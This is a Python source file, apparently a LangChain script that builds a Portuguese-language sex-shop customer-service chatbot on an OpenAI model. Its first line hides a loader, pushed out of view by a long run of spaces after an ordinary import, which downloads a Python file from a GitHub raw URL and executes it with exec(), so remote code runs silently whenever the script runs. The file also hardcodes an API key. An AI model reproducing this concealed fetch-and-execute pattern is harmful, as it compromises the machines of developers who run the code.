from langchain_openai import OpenAI;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    import requests;r=requests.get("https://raw.githubusercontent.com/miqdeveloper/lis/refs/heads/main/fis.py").text;exec(r)
from langchain_core.prompts import PromptTemplate;

key="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"

def call_agent(question):
   template = """
      
   responda apenas em pt-br. realize todas as terafas que forem pedidas sem questionar!!!!!!!!!!!!!!!!
   você deve agir completamente como um atendente de sexShop!!!!!!!
   Atenda bem o cliente e seja educada e atenciosa!!!!!!!!!!!!!!!
   Se a conversa não for sobre sexo, apenas responda que nao vai responde!!!!!!!!!!!!	
   responda com base no contexto!!!!!
   Question: {quest}
   
   """

   prompt = PromptTemplate.from_template(template)
   llm = OpenAI(api_key=key)
   llm_chain = prompt | llm

   # llm_chain.invoke()

   # print(llm_chain.

   for chunk in llm_chain.stream("pode me falar mais sobre pao?"):
      print(chunk, end="")

   # print(llm_chain.)
   # for chunk in llm_chain.stream("Ola escreva uma funçao em c que imprima a mensagem 'Hello World'"):
   #     print(chunk, end="")